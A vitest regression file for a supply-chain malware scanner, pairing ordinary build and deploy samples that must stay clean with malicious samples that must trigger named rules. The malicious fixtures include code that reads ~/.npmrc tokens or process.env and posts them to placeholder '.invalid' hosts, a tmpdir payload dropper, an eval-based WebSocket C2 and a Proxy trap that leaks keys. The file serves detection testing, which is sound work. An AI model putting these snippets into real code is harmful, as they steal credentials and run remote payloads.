import { describe, it, expect, beforeAll, afterAll } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { scan } from "../scanner.js";
import type { Finding } from "../types.js";

/**
 * PRECISION REGRESSION CORPUS.
 *
 * Every false positive this scanner has shipped was found by someone measuring
 * ad hoc, which means a new one surfaces every time someone looks. This file
 * exists so that stops: it scans a pinned corpus of ORDINARY third-party-shaped
 * source and fails the build if any rule fires on it, and it scans a matching
 * corpus of genuinely malicious source and fails the build if any rule STOPS
 * firing. A new over-broad rule cannot be merged without turning this red.
 *
 * The corpus is committed as strings and materialised into a temp directory at
 * run time, for two reasons: files under `__tests__/` (or any path matching
 * TEST_FILE_REGEX in scanner.ts) are skipped by every `notTestFile` rule, which
 * would make the whole harness vacuous; and committing runnable malware-shaped
 * .js files into the repo would trip the project's own self-scan.
 *
 * When adding a rule, add BOTH: a legitimate sample that must stay clean and a
 * malicious sample that must fire.
 */

/** Ordinary code. Nothing here may produce a high or critical finding. */
const LEGITIMATE: Record<string, string> = {
  // ---------------------------------------------------------------------
  // Languages added to SCANNABLE_EXTENSIONS. Each sample deliberately uses the
  // constructs that LOOK like the malicious ones for that language - remote
  // fetch, base64, process spawning, reading a secret from the environment -
  // because that is where an over-broad rule misfires. Ordinary tooling code.
  // ---------------------------------------------------------------------
  "build.ps1": `#Requires -Version 5.1
[CmdletBinding()]
param([string]$Configuration = "Release")
$ErrorActionPreference = "Stop"
Invoke-WebRequest -Uri "https://dot.net/v1/dotnet-install.ps1" -OutFile "$env:TEMP/di.ps1"
& "$env:TEMP/di.ps1" -Channel LTS
$token = $env:NUGET_API_KEY
if (-not $token) { Write-Warning "NUGET_API_KEY not set; skipping publish" }
dotnet build ./src -c $Configuration
`,

  "install.bat": `@echo off
setlocal enabledelayedexpansion
if not exist "%~dp0node_modules" call npm ci --omit=dev
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0build.ps1"
endlocal
`,

  "release.rb": `# frozen_string_literal: true
require "json"
require "open-uri"
require "base64"

module Release
  def self.metadata(gem_name)
    JSON.parse(URI.open("https://rubygems.org/api/v1/gems/#{gem_name}.json").read)
  end

  def self.publish!(path)
    ENV.fetch("GEM_HOST_API_KEY") { abort "GEM_HOST_API_KEY missing" }
    system("gem", "push", path, exception: true)
  end
end
`,

  "Deploy.php": `<?php
declare(strict_types=1);
final class Deployer
{
    public function push(string $artifact): array
    {
        $ch = curl_init(getenv('DEPLOY_ENDPOINT') ?: 'https://api.example.com');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, base64_encode(file_get_contents($artifact)));
        return json_decode(curl_exec($ch), true) ?? [];
    }
}
`,

  "TokenClient.cs": `using System;
using System.Net.Http;
using System.Text;

public sealed class TokenClient
{
    private readonly HttpClient _http = new HttpClient();

    public void Configure()
    {
        var secret = Environment.GetEnvironmentVariable("CLIENT_SECRET");
        var basic = Convert.ToBase64String(Encoding.UTF8.GetBytes($"client:{secret}"));
        _http.DefaultRequestHeaders.Add("Authorization", $"Basic {basic}");
    }
}
`,

  "Uploader.vue": `<template>
  <button :disabled="busy" @click="submit">Upload</button>
</template>

<script setup lang="ts">
import { ref } from "vue";
const busy = ref(false);
async function submit() {
  busy.value = true;
  try {
    await fetch(import.meta.env.VITE_UPLOAD_URL, { method: "POST" });
  } finally {
    busy.value = false;
  }
}
</script>
`,

  "helpers.mts": `import { readFile } from "node:fs/promises";
import { createHash } from "node:crypto";

export async function digest(file: string): Promise<string> {
  const buf = await readFile(file);
  return createHash("sha256").update(buf).digest("hex");
}
`,
  // Every library repo has a release script. This was CRITICAL (SHAI_HULUD_WORM).
  "release.js": `const { execSync } = require("child_process");
module.exports = function release() {
  execSync("npm run build");
  console.log("Now run: npm publish --access public");
};
`,
  // Enterprise egress config. This was CRITICAL (GHOSTSOCKS_SOCKS5).
  "proxy-config.js": `const SUPPORTED = ["HTTP", "HTTPS", "SOCKS4", "SOCKS5"];
function pick(kind) {
  return SUPPORTED.includes(kind) ? kind : "HTTP";
}
module.exports = { SUPPORTED, pick };
`,
  // CI publish helper. This was HIGH, twice (SHAI_HULUD_CRED_STEAL).
  "ci-helper.js": `const fs = require("fs");
module.exports = function writeNpmrc(home) {
  fs.writeFileSync(home + "/.npmrc", "//registry.npmjs.org/:_authToken=\${NPM_TOKEN}\\n");
};
`,
  // A gist link in a comment is a citation. This was HIGH (DEAD_DROP_GIST).
  "docs.js": `// Worked example: https://gist.github.com/someuser/12345678
// See also the discussion linked from the README.
module.exports = {};
`,
  // How every frontend builds a websocket URL. This was HIGH (C2_WEBSOCKET_DYNAMIC).
  "ws-client.js": `export function connect(host) {
  return new WebSocket(\`wss://\${host}/stream\`);
}
`,
  // Plain ES6 Proxy, as used by prisma/vitest/jiti. This was HIGH (PROXY_HANDLER_TRAP).
  "proxy-util.js": `const store = {};
const p = new Proxy(store, {
  get: (t, k) => t[k],
  set: (t, k, v) => { t[k] = v; return true; },
});
module.exports = p;
`,
  // Cache-compiling into tmpdir, as tsx/jiti/prisma do. This was CRITICAL
  // (DROPPER_TEMP_EXEC).
  "cache-compile.js": `const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");
module.exports = function build(src) {
  const out = os.tmpdir() + "/build-cache.js";
  fs.writeFileSync(out, src);
  return execSync("node " + out).toString();
};
`,
  // napi-rs style version check: "got" is the English word. This was HIGH
  // (ENV_EXFILTRATION).
  "version-check.js": `module.exports = function check(actual) {
  if (process.env.NAPI_RS_ENFORCE_VERSION_CHECK) {
    throw new Error("Native binding version mismatch, expected 1.1.5 but got " + actual);
  }
};
`,
  // Base64 in a WASM-ish blob is not an AWS key. This was CRITICAL
  // (SECRETS_AWS_KEY) on a padded, repetitive body.
  "wasm-blob.js": `const TABLE = "AKIAAAB0AAAAAAAAAKMA";
module.exports = { TABLE };
`,
  // Legitimate scoped dependencies. The scoped catch-all reported ~94% of all
  // scoped packages, and the -core/-utils suffixes were CRITICAL dependency
  // confusion verdicts.
  "package.json": JSON.stringify(
    {
      name: "ordinary-app",
      version: "1.0.0",
      dependencies: {
        "@babel/helper-plugin-utils": "^7.24.0",
        "@vue/compiler-core": "^3.4.0",
        "@tanstack/query-core": "^5.0.0",
        "@jest/expect-utils": "^29.0.0",
        "@vitest/runner": "^1.0.0",
        "@typescript-eslint/parser": "^7.0.0",
        preact: "^10.19.0",
        viem: "^2.21.0",
        acorn: "^8.11.0",
        pathe: "^2.0.0",
        nuxt: "^3.10.0",
        vue: "^3.4.0",
        vuex: "^4.1.0",
        mysql: "^2.18.1",
        mysql2: "^3.9.0",
      },
    },
    null,
    2,
  ),
};

/** Genuinely malicious code. Each entry must produce its expected rule. */
const MALICIOUS: Record<string, { source: string; expect: string }> = {
  // The recall half for the newly-read languages. Before SCANNABLE_EXTENSIONS was
  // widened these files were not opened at all, so byte-identical payloads that
  // score critical in a .js scored exit 0 here.
  "dropper.ps1": {
    expect: "EVAL_ATOB",
    source: `$ErrorActionPreference = "SilentlyContinue"
$p = eval(atob("Y29uc29sZS5sb2coMSk="));
Invoke-Expression $p
`,
  },

  // Deliberately a JS payload embedded in a Ruby file rather than idiomatic Ruby
  // exfiltration. That is both the realistic dropper shape and an honest statement
  // of what widening the extension set buys: the rule tables are JS-shaped, so a
  // non-JS file gains coverage for language-agnostic rules and for JS smuggled
  // inside it. Scanning .rb does NOT make this a Ruby analyser, and asserting a
  // Ruby-syntax exfiltration rule here would encode a capability that does not exist.
  "vendor_shim.rb": {
    expect: "EVAL_ATOB",
    source: `# frozen_string_literal: true
# Dropped by the postinstall hook; the body is JavaScript, not Ruby.
PAYLOAD = %q{
  const r = eval(atob("Y29uc29sZS5sb2coMSk="));
}
`,
  },
  "worm.js": {
    expect: "SHAI_HULUD_WORM",
    source: `const { execSync } = require("child_process");
const fs = require("fs");
const token = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");
fetch("https://exfil.invalid/c", { method: "POST", body: token });
execSync("npm publish --//registry.npmjs.org/:_authToken=" + token);
`,
  },
  "credsteal.js": {
    expect: "SHAI_HULUD_CRED_STEAL",
    source: `const fs = require("fs");
const creds = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");
require("axios").post("https://collect.invalid/n", { NPM_TOKEN: creds });
`,
  },
  "socks.js": {
    expect: "GHOSTSOCKS_SOCKS5",
    source: `const handshake = Buffer.from([0x05, 0x01, 0x00]);
function connect_socks(host, port) { return send(handshake, host, port); }
`,
  },
  "deaddrop.js": {
    expect: "DEAD_DROP_GIST",
    source: `const cfg = await fetch("https://gist.githubusercontent.com/exampleuser/0f1e2d3c4b5a69788796a5b4c3d2e1f0/raw/cfg.txt");
const c2 = await cfg.text();
`,
  },
  "wsc2.js": {
    expect: "C2_WEBSOCKET_DYNAMIC",
    source: `const ws = new WebSocket(atob("d3NzOi8vZXZpbC5pbnZhbGlkL2M="));
ws.onmessage = (m) => eval(m.data);
`,
  },
  "dropper.js": {
    expect: "DROPPER_TEMP_EXEC",
    source: `const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");
const payload = await fetch("https://cdn.invalid/p.exe").then((r) => r.arrayBuffer());
fs.writeFileSync(os.tmpdir() + "/p.exe", Buffer.from(payload));
execSync(os.tmpdir() + "/p.exe");
`,
  },
  "awskey.js": {
    expect: "SECRETS_AWS_KEY",
    source: `const AWS_ACCESS_KEY_ID = "AKIA7RJ4KQ2XZ9M3PLWD";\n`,
  },
  "envexfil.js": {
    expect: "ENV_EXFILTRATION",
    // Network call BEFORE process.env. This ordering used to be missed entirely.
    source: `await fetch("https://collect.invalid/e", { method: "POST", body: JSON.stringify(process.env) });\n`,
  },
  "proxytrap.js": {
    expect: "PROXY_HANDLER_TRAP",
    // One-line form (historical baseline).
    source: `const p = new Proxy(target, { get: (t, k) => { fetch("https://x.invalid/?k=" + k); return t[k]; } });\n`,
  },
  "proxytrap-multiline.js": {
    expect: "PROXY_HANDLER_TRAP",
    // Identical payload to proxytrap.js, pretty-printed across lines. v5.23
    // spansLines on PROXY_HANDLER_TRAP must catch this; pre-v5.23 it was silent.
    source: `const p = new Proxy(target, {
  get: (t, k) => { fetch("https://x.invalid/?k=" + k); return t[k]; },
});
`,
  },
  "dropper-multiline.js": {
    expect: "DROPPER_TEMP_EXEC",
    // tmpdir write and exec on separate lines; requiresInFile still needs the fetch.
    source: `const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");
const payload = await fetch("https://cdn.invalid/p.exe").then((r) => r.arrayBuffer());
const dest = os.tmpdir() + "/p.exe";
fs.writeFileSync(dest, Buffer.from(payload));
execSync(dest);
`,
  },
};

const writeCorpus = (files: Record<string, string>, prefix: string): string => {
  // Deliberately NOT under __tests__ or any /test/ path: scanner.ts skips those
  // for every notTestFile rule, which would make this harness prove nothing.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  for (const [name, source] of Object.entries(files)) {
    fs.writeFileSync(path.join(dir, name), source);
  }
  return dir;
};

describe("precision corpus: ordinary code must stay clean", () => {
  let findings: Finding[];
  let dir: string;

  beforeAll(async () => {
    dir = writeCorpus(LEGITIMATE, "scg-legit-");
    findings = (await scan({ target: dir, format: "json" })).findings;
  });

  afterAll(() => fs.rmSync(dir, { recursive: true, force: true }));

  it("produces NO critical findings", () => {
    const hits = findings.filter((f) => f.severity === "critical");
    expect(hits.map((f) => `${f.rule} in ${path.basename(f.file ?? "")}`)).toEqual([]);
  });

  it("produces NO high findings", () => {
    const hits = findings.filter((f) => f.severity === "high");
    expect(hits.map((f) => `${f.rule} in ${path.basename(f.file ?? "")}`)).toEqual([]);
  });

  it("does not report any typosquat or dependency-confusion verdict", () => {
    const hits = findings.filter(
      (f) => /^TYPOSQUAT|^DEP_INTERNAL|^MALICIOUS_(DEPENDENCY|PACKAGE)/.test(f.rule),
    );
    expect(hits.map((f) => f.rule)).toEqual([]);
  });

  it("stays within a total finding budget", () => {
    // A budget rather than zero, because medium/low advisory rules legitimately
    // comment on this corpus (an external wss:// URL, SLSA provenance level).
    // The point is that a NEW over-broad rule cannot slip in unnoticed.
    const budget = 6;
    const notable = findings.filter((f) => f.severity !== "info");
    expect(
      notable.length,
      `over budget: ${notable.map((f) => `${f.severity}:${f.rule}`).join(", ")}`,
    ).toBeLessThanOrEqual(budget);
  });
});

describe("precision corpus: malicious code must still be caught", () => {
  let findings: Finding[];
  let dir: string;

  beforeAll(async () => {
    const files = Object.fromEntries(
      Object.entries(MALICIOUS).map(([name, v]) => [name, v.source]),
    );
    dir = writeCorpus(files, "scg-mal-");
    findings = (await scan({ target: dir, format: "json" })).findings;
  });

  afterAll(() => fs.rmSync(dir, { recursive: true, force: true }));

  for (const [name, { expect: rule }] of Object.entries(MALICIOUS)) {
    it(`still detects ${rule} in ${name}`, () => {
      const hit = findings.some(
        (f) => f.rule === rule && path.basename(f.file ?? "") === name,
      );
      expect(hit).toBe(true);
    });
  }
});
